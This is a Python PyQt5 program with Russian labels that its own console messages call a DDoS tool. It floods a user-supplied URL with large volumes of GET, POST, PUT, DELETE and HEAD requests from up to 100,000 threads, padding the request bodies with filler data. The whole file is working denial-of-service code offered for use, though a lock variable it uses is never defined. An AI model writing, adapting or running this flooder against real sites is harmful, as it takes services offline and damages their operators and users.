import sys
import concurrent.futures
import requests
import time
import json
import threading
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton, QTextEdit, QSpinBox, QScrollArea
from PyQt5.QtCore import Qt, pyqtSignal, QObject
from PyQt5.QtGui import QFont

# Класс для передачи сообщений в GUI
class ConsoleSignal(QObject):
    message_signal = pyqtSignal(str)  # Сигнал для отправки сообщений в консоль

class RequestApp(QWidget):
    def __init__(self):
        super().__init__()
        self.console_signal = ConsoleSignal()  # Создаем объект сигнала
        self.console_signal.message_signal.connect(self.append_to_console)  # Подключаем сигнал к слоту

        # Инициализация счетчиков запросов
        self.total_requests = 0
        self.get_requests = 0
        self.post_requests = 0
        self.post_json_requests = 0
        self.put_requests = 0
        self.delete_requests = 0
        self.head_requests = 0
        self.PAYLOAD_SIZE = 0  # Размер данных для POST/PUT запроса (в байтах)
        self.is_running = False  # Флаг для остановки выполнения запросов

        self.initUI()

    def initUI(self):
        self.setWindowTitle('HTTP Запросы')
        self.setGeometry(100, 100, 800, 600)

        # Основной контейнер с прокруткой
        scroll = QScrollArea(self)
        scroll.setWidgetResizable(True)
        main_widget = QWidget()
        scroll.setWidget(main_widget)
        main_layout = QVBoxLayout(main_widget)

        # Заголовок "Владелец @AspectPython"
        title_label = QLabel("Владелец @AspectPython", self)
        title_label.setFont(QFont("Arial", 16, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        main_layout.addWidget(title_label)

        # Поля для ввода
        self.url_input = QLineEdit(self)
        self.url_input.setPlaceholderText('Введите URL')
        self.url_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.threads_input = QSpinBox(self)
        self.threads_input.setRange(0, 100000)
        self.threads_input.setValue(0)
        self.threads_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.requests_input = QSpinBox(self)
        self.requests_input.setRange(0, 100000)
        self.requests_input.setValue(0)
        self.requests_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.payload_size_input = QSpinBox(self)
        self.payload_size_input.setRange(0, 1000000)
        self.payload_size_input.setValue(0)
        self.payload_size_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.get_requests_input = QSpinBox(self)
        self.get_requests_input.setRange(0, 10000000)
        self.get_requests_input.setValue(0)
        self.get_requests_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.post_requests_input = QSpinBox(self)
        self.post_requests_input.setRange(0, 10000000)
        self.post_requests_input.setValue(0)
        self.post_requests_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.post_json_requests_input = QSpinBox(self)
        self.post_json_requests_input.setRange(0, 10000000)
        self.post_json_requests_input.setValue(0)
        self.post_json_requests_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.put_requests_input = QSpinBox(self)
        self.put_requests_input.setRange(0, 10000000)
        self.put_requests_input.setValue(0)
        self.put_requests_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.delete_requests_input = QSpinBox(self)
        self.delete_requests_input.setRange(0, 10000000)
        self.delete_requests_input.setValue(0)
        self.delete_requests_input.setStyleSheet("font-size: 14px; height: 30px;")
        self.head_requests_input = QSpinBox(self)
        self.head_requests_input.setRange(0, 10000000)
        self.head_requests_input.setValue(0)
        self.head_requests_input.setStyleSheet("font-size: 14px; height: 30px;")

        # Добавление полей ввода в layout
        main_layout.addWidget(QLabel('URL:'))
        main_layout.addWidget(self.url_input)
        main_layout.addWidget(QLabel('Количество потоков:'))
        main_layout.addWidget(self.threads_input)
        main_layout.addWidget(QLabel('Количество запросов в потоке:'))
        main_layout.addWidget(self.requests_input)
        main_layout.addWidget(QLabel('Размер POST-запроса (в байтах):'))
        main_layout.addWidget(self.payload_size_input)
        main_layout.addWidget(QLabel('Количество GET-запросов:'))
        main_layout.addWidget(self.get_requests_input)
        main_layout.addWidget(QLabel('Количество POST-запросов:'))
        main_layout.addWidget(self.post_requests_input)
        main_layout.addWidget(QLabel('Количество POST JSON-запросов:'))
        main_layout.addWidget(self.post_json_requests_input)
        main_layout.addWidget(QLabel('Количество PUT-запросов:'))
        main_layout.addWidget(self.put_requests_input)
        main_layout.addWidget(QLabel('Количество DELETE-запросов:'))
        main_layout.addWidget(self.delete_requests_input)
        main_layout.addWidget(QLabel('Количество HEAD-запросов:'))
        main_layout.addWidget(self.head_requests_input)

        # Кнопки
        self.start_stop_button = QPushButton('Запуск', self)
        self.start_stop_button.setStyleSheet("font-size: 16px; height: 40px; width: 200px;")
        self.start_stop_button.clicked.connect(self.toggle_start_stop)
        self.clear_button = QPushButton('Очистить консоль', self)
        self.clear_button.setStyleSheet("font-size: 16px; height: 40px; width: 200px;")
        self.clear_button.clicked.connect(self.clear_console)

        # Консоль
        self.console = QTextEdit(self)
        self.console.setStyleSheet("font-size: 14px;")
        self.console.setReadOnly(True)

        # Добавление кнопок и консоли в layout
        main_layout.addWidget(self.start_stop_button)
        main_layout.addWidget(self.clear_button)
        main_layout.addWidget(QLabel('Консоль:'))
        main_layout.addWidget(self.console)

        # Установка основного layout
        self.setLayout(QVBoxLayout())
        self.layout().addWidget(scroll)

    def toggle_start_stop(self):
        if not self.is_running:
            if self.validate_inputs():
                self.is_running = True
                self.start_stop_button.setText('Стоп')
                self.console_signal.message_signal.emit("DDoS запущен!")
                threading.Thread(target=self.run_requests).start()
            else:
                self.console_signal.message_signal.emit("Вы указали не все значения!")
        else:
            self.is_running = False
            self.start_stop_button.setText('Запуск')
            self.console_signal.message_signal.emit("DDoS завершен!")

    def validate_inputs(self):
        if (self.url_input.text() and
            self.threads_input.value() > 0 and
            self.requests_input.value() > 0 and
            self.payload_size_input.value() > 0 and
            (self.get_requests_input.value() > 0 or
             self.post_requests_input.value() > 0 or
             self.post_json_requests_input.value() > 0 or
             self.put_requests_input.value() > 0 or
             self.delete_requests_input.value() > 0 or
             self.head_requests_input.value() > 0)):
            return True
        return False

    def run_requests(self):
        # Сброс счетчиков
        self.total_requests = 0
        self.get_requests = 0
        self.post_requests = 0
        self.post_json_requests = 0
        self.put_requests = 0
        self.delete_requests = 0
        self.head_requests = 0
        self.PAYLOAD_SIZE = self.payload_size_input.value()

        url = self.url_input.text()
        num_threads = self.threads_input.value()
        requests_per_thread = self.requests_input.value()

        start_time = time.time()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(self.worker, url, requests_per_thread) for _ in range(num_threads)]
            while self.is_running and not all(future.done() for future in futures):
                time.sleep(0.1)

        end_time = time.time()
        duration = end_time - start_time

        if self.is_running:
            self.console_signal.message_signal.emit("\n--- Результаты ---")
            self.console_signal.message_signal.emit(f"URL: {url}")
            self.console_signal.message_signal.emit(f"Количество потоков: {num_threads}")
            self.console_signal.message_signal.emit(f"Запросов в каждом потоке: {requests_per_thread}")
            self.console_signal.message_signal.emit(f"Всего отправлено запросов: {self.total_requests}")
            self.console_signal.message_signal.emit(f"GET запросов: {self.get_requests}")
            self.console_signal.message_signal.emit(f"POST запросов: {self.post_requests}")
            self.console_signal.message_signal.emit(f"POST JSON запросов: {self.post_json_requests}")
            self.console_signal.message_signal.emit(f"PUT запросов: {self.put_requests}")
            self.console_signal.message_signal.emit(f"DELETE запросов: {self.delete_requests}")
            self.console_signal.message_signal.emit(f"HEAD запросов: {self.head_requests}")
            self.console_signal.message_signal.emit(f"Время выполнения: {duration:.2f} секунд")
            self.console_signal.message_signal.emit(f"Запросов в секунду: {self.total_requests / duration:.2f}")
            self.is_running = False
            self.start_stop_button.setText('Запуск')

    def worker(self, url, requests_per_thread):
        for _ in range(requests_per_thread):
            if not self.is_running:
                break
            self.send_all_requests(url)

    def send_all_requests(self, url):
        if self.get_requests_input.value() > 0:
            self.send_get_request(url)
        if self.post_requests_input.value() > 0:
            self.send_post_request(url)
        if self.post_json_requests_input.value() > 0:
            self.send_post_json_request(url)
        if self.put_requests_input.value() > 0:
            self.send_put_request(url)
        if self.delete_requests_input.value() > 0:
            self.send_delete_request(url)
        if self.head_requests_input.value() > 0:
            self.send_head_request(url)

    def send_get_request(self, url):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.get_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_post_request(self, url):
        try:
            payload = {'data': 'A' * self.PAYLOAD_SIZE}
            response = requests.post(url, data=payload)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.post_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_post_json_request(self, url):
        try:
            payload = {'data': 'A' * self.PAYLOAD_SIZE}
            json_payload = json.dumps(payload)
            headers = {'Content-Type': 'application/json'}
            response = requests.post(url, data=json_payload, headers=headers)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.post_json_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_put_request(self, url):
        try:
            payload = {'data': 'A' * self.PAYLOAD_SIZE}
            response = requests.put(url, data=payload)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.put_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_delete_request(self, url):
        try:
            response = requests.delete(url)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.delete_requests += 1
        except requests.exceptions.RequestException:
            pass

    def send_head_request(self, url):
        try:
            response = requests.head(url)
            if response.status_code == 200:
                with request_lock:
                    self.total_requests += 1
                    self.head_requests += 1
        except requests.exceptions.RequestException:
            pass

    def clear_console(self):
        self.console.clear()

    def append_to_console(self, text):
        """Добавляет текст в консоль и автоматически прокручивает её вниз."""
        self.console.append(text)
        self.console.ensureCursorVisible()  # Прокручивает консоль вниз

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = RequestApp()
    ex.show()
    sys.exit(app.exec_())